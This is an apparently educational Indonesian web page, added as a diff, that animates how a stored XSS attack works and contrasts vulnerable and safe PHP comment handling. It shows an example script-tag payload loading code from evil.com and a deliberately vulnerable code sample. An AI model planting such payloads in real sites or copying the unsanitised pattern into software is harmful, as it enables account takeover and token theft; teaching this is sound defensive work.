@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="id">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Stored XSS — Animasi | CYBERSHIELD 2026</title><link rel="stylesheet" href="shared.css"></head>
+<body>
+<div class="bg-grid"></div><div class="bg-glow bg-glow-1"></div><div class="bg-glow bg-glow-2"></div>
+<div class="page">
+    <div class="anim-header">
+        <div class="anim-badge" style="background:rgba(239,68,68,0.15);color:#ef4444;border:1px solid rgba(239,68,68,0.3);">💾 STORED CROSS-SITE SCRIPTING</div>
+        <h1>Cara Kerja <span>Stored XSS</span></h1>
+        <p>Script tersimpan permanen di database server dan akan menyerang SEMUA user yang melihat halaman tersebut.</p>
+        <div class="nav-links"><a href="xss_reflected.html" class="nav-link">← Reflected XSS</a><a href="index.html" class="nav-link">🏠 Semua Animasi</a><a href="xss_dom.html" class="nav-link">DOM XSS →</a></div>
+    </div>
+    <div class="anim-container">
+        <div class="anim-viewport">
+            <div class="flow" id="flow">
+                <div class="flow-step" data-step="0"><div class="step-num">1</div><div class="step-content"><div class="step-label">📝 Attacker menemukan form input (misal komentar)</div><div class="step-desc">Kolom komentar, profil user, forum - fitur yang menyimpan input text ke database.</div></div></div>
+                <div class="step-connector"></div>
+                <div class="flow-step" data-step="1"><div class="step-num">2</div><div class="step-content"><div class="step-label">💉 Attacker mensubmit payload</div><div class="step-desc">Mengirimkan: <code>&lt;script src="http://evil.com/xss.js"&gt;&lt;/script&gt;</code> sebagai komentar.</div></div></div>
+                <div class="step-connector"></div>
+                <div class="flow-step" data-step="2"><div class="step-num">3</div><div class="step-content"><div class="step-label">💾 Payload tersimpan di Database</div><div class="step-desc">Server menyimpan script jahat ini secara permanen ke dalam database tanpa sanitasi.</div></div></div>
+                <div class="step-connector"></div>
+                <div class="flow-step" data-step="3"><div class="step-num">4</div><div class="step-content"><div class="step-label">👤 Korban mengunjungi halaman</div><div class="step-desc">Korban (atau bahkan Admin) membuka halaman komentar tersebut.</div></div></div>
+                <div class="step-connector"></div>
+                <div class="flow-step" data-step="4"><div class="step-num">5</div><div class="step-content"><div class="step-label">💥 Script tereksekusi otomatis</div><div class="step-desc">Browser korban mengunduh dan mengeksekusi xss.js, yang bisa langsung mengubah password atau mencuri token.</div></div></div>
+
+            </div>
+        </div>
+        <div class="anim-controls"><button class="ctrl-btn" id="prevBtn" onclick="prevStep()" disabled>← Prev</button><span class="step-indicator" id="stepIndicator">1 / 5</span><button class="ctrl-btn primary" id="nextBtn" onclick="nextStep()">Next →</button><button class="ctrl-btn" id="autoBtn" onclick="autoPlay()">▶ Auto</button></div>
+    </div>
+    <div class="code-compare">
+        <div class="code-box"><div class="code-label vuln">⚠️ RENTAN</div><div class="code-body">// Menyimpan ke DB
+$comment = $_POST['comment'];
+$db->query("INSERT INTO comments VALUES ('$comment')");
+
+// Menampilkan ke user
+echo $row['comment'];</div></div>
+        <div class="code-box"><div class="code-label safe">✅ AMAN</div><div class="code-body">// Gunakan prepared statements untuk insert
+
+// SAAT MENAMPILKAN:
+echo htmlspecialchars($row['comment']);</div></div>
+    </div>
+    <div class="info-grid">
+        <div class="info-card danger"><h3>💀 Dampak</h3><ul><li>Mass account takeover</li><li>Penyebaran worm (seperti Samy Worm)</li><li>Defacement permanen</li><li>Aksi massal tanpa izin</li></ul></div>
+        <div class="info-card success"><h3>🛡️ Pencegahan</h3><ul><li>Output Encoding (mutlak!)</li><li>Sanitasi input (HTML Purifier)</li><li>CSP</li><li>WAF (Web Application Firewall)</li></ul></div>
+    </div>
+    <div class="anim-disclaimer">⚠️ <strong>EDUKASI ONLY</strong></div>
+</div>
+<script>let current=-1;const total=5;const steps=document.querySelectorAll('.flow-step');function updateSteps(){steps.forEach((s,i)=>{s.classList.remove('active','done');if(i<current)s.classList.add('done');else if(i===current)s.classList.add('active');});document.getElementById('stepIndicator').textContent=`${current+1} / ${total}`;document.getElementById('prevBtn').disabled=current<=0;document.getElementById('nextBtn').disabled=current>=total-1;}function nextStep(){if(current<total-1){current++;updateSteps();}}function prevStep(){if(current>0){current--;updateSteps();}}function autoPlay(){current=-1;updateSteps();let i=0;const iv=setInterval(()=>{if(i>=total){clearInterval(iv);return;}current=i++;updateSteps();},1200);}nextStep();</script>
+</body></html>
